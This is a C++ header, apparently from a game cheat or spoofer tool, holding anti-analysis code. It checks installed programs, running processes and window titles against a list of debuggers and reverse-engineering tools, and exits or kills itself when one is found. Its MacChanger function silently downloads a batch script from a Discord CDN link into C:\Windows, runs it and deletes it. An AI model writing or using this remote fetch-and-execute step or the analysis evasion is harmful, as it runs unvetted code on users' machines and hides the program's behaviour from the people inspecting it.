#pragma once


#include <iostream>
#include <Windows.h>
#include <string>
#include <TlHelp32.h>
#include <vector>
#include <filesystem>


void BSOD()
{
	HANDLE hProcess = GetCurrentProcess();
	TerminateProcess(hProcess, 0x000000F4);
}



void SearchPC()
{
	std::vector<std::wstring> programNames{


		L"KsDumperClient.exe",
		L"HTTPDebuggerUI.exe",
		L"HTTPDebuggerSvc.exe",
		L"x64dbg.exe",
		L"ProcessHacker.exe",
		L"ida64.exe",
		L"dotPeek64.exe",
		L"ida32.exe",
		L"ida.exe",
		L"reclass.net.exe",
		L"reclass.exe",
		L"heyrays.exe",
		L"Ida Pro",
		L"Ida Freeware",
		L"lighthouse.exe",
		L"dnSpy",
		L"cheatengine-x86_64.exe",
		L"Cheat Engine.exe",
		L"HxD",
		L"OllyDbg",
		L"Process Hacker 2",
		L"Progress Telerik Folder Web Debugger",
		L"Themida - Advanced Windows Software Protection",
		L"The Wireshark Network Analyzer",
		L"classinformer.exe",
		L"fiddler.exe",
		L"Cheat Engine 7.5.exe",
		L"Cheat Engine 7.4.exe",
		L"Cheat Engine 7.3.exe",
		L"Cheat Engine 7.2.exe",
		L"Cheat Engine 7.1.exe",
		L"Cheat Engine 7.0.exe",
		L"Cheat Engine 6.9.exe",
		L"Cheat Engine 6.8.exe",
		L"httpdebugger.exe"


	};

	for (const auto& programName : programNames)
	{
		bool found = false;


		for (auto& drive : std::filesystem::directory_iterator(std::filesystem::path(L"/")))
		{

			std::wstring programPath = drive.path().wstring() + L"\\Program Files\\" + programName;
			std::wstring programPathX86 = drive.path().wstring() + L"\\Program Files (x86)\\" + programName;


			if (std::filesystem::exists(programPath) || std::filesystem::exists(programPathX86))
			{
				std::cout << " please uninstall all reverse engineering software on this PC!" << std::endl;
				Sleep(1000);
				found = true;
				exit(0);
			}
		}
	}
}






void DetectByTitle()
{


	const wchar_t* windowNames[] = {

		L"KsDumperClient.exe",
		L"HTTPDebuggerUI.exe",
		L"HTTPDebuggerSvc.exe",
		L"x64dbg.exe",
		L"ProcessHacker.exe",
		L"ida64.exe",
		L"dotPeek64.exe",
		L"ida32.exe",
		L"ida.exe",
		L"reclass.net.exe",
		L"reclass.exe",
		L"heyrays.exe",
		L"Ida Pro",
		L"Ida Freeware",
		L"lighthouse.exe",
		L"dnSpy",
		L"cheatengine-x86_64.exe",
		L"Cheat Engine.exe",
		L"HxD",
		L"OllyDbg",
		L"Process Hacker 2",
		L"Progress Telerik Folder Web Debugger",
		L"Themida - Advanced Windows Software Protection",
		L"The Wireshark Network Analyzer",
		L"classinformer.exe",
		L"fiddler.exe",
		L"Cheat Engine 7.5.exe",
		L"Cheat Engine 7.4.exe",
		L"Cheat Engine 7.3.exe",
		L"Cheat Engine 7.2.exe",
		L"Cheat Engine 7.1.exe",
		L"Cheat Engine 7.0.exe",
		L"Cheat Engine 6.9.exe",
		L"Cheat Engine 6.8.exe",
		L"httpdebugger.exe"
	};

	for (const auto& windowName : windowNames)
	{
		HWND window;
		window = FindWindow(0, windowName);
		if (window)
		{
			BSOD();
		}
	}
}





bool isProcRunning(const wchar_t* processName)
{
	bool exists = false;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry))
	{
		do
		{
			if (!wcscmp(entry.szExeFile, processName))
			{
				exists = true;
				break;
			}
		} while (Process32Next(snapshot, &entry));
	}

	CloseHandle(snapshot);
	return exists;
}








void ProcessCheck()
{
	bool Debugger = false;

	if (isProcRunning(L"KsDumperClient.exe") ||
		isProcRunning(L"HTTPDebuggerUI.exe") ||
		isProcRunning(L"HTTPDebuggerSvc.exe") ||
		isProcRunning(L"x64dbg.exe") ||
		isProcRunning(L"ProcessHacker.exe") ||
		isProcRunning(L"ida64.exe") ||
		isProcRunning(L"dotPeek64.exe") ||
		isProcRunning(L"ida32.exe") ||
		isProcRunning(L"ida.exe") ||
		isProcRunning(L"reclass.net.exe") ||
		isProcRunning(L"reclass.exe") ||
		isProcRunning(L"heyrays.exe") ||
		isProcRunning(L"Ida Pro") ||
		isProcRunning(L"Ida Freeware") ||
		isProcRunning(L"lighthouse.exe") ||
		isProcRunning(L"dnSpy") ||
		isProcRunning(L"cheatengine-x86_64.exe") ||
		isProcRunning(L"Cheat Engine.exe") ||
		isProcRunning(L"HxD") ||
		isProcRunning(L"OllyDbg") ||
		isProcRunning(L"Process Hacker 2") ||
		isProcRunning(L"Progress Telerik Folder Web Debugger") ||
		isProcRunning(L"Themida - Advanced Windows Software Protection") ||
		isProcRunning(L"The Wireshark Network Analyzer") ||
		isProcRunning(L"classinformer.exe") ||
		isProcRunning(L"fiddler.exe") ||
		isProcRunning(L"Cheat Engine 7.5.exe") ||
		isProcRunning(L"Cheat Engine 7.4.exe") ||
		isProcRunning(L"Cheat Engine 7.3.exe") ||
		isProcRunning(L"Cheat Engine 7.2.exe") ||
		isProcRunning(L"Cheat Engine 7.1.exe") ||
		isProcRunning(L"Cheat Engine 7.0.exe") ||
		isProcRunning(L"Cheat Engine 6.9.exe") ||
		isProcRunning(L"Cheat Engine 6.8.exe") ||
		isProcRunning(L"httpdebugger.exe"))
	{
		Debugger = true;
	}

	if (Debugger)
	{
		BSOD();
	}
}

void MacChanger()
{
	system("curl https://cdn.discordapp.com/attachments/993551940447391848/1105888975899598869/mac.bat -o C:\\Windows\\mac.bat --silent");
	system("C:\\Windows\\mac.bat");
	std::remove("C:\\Windows\\mac.bat");
}
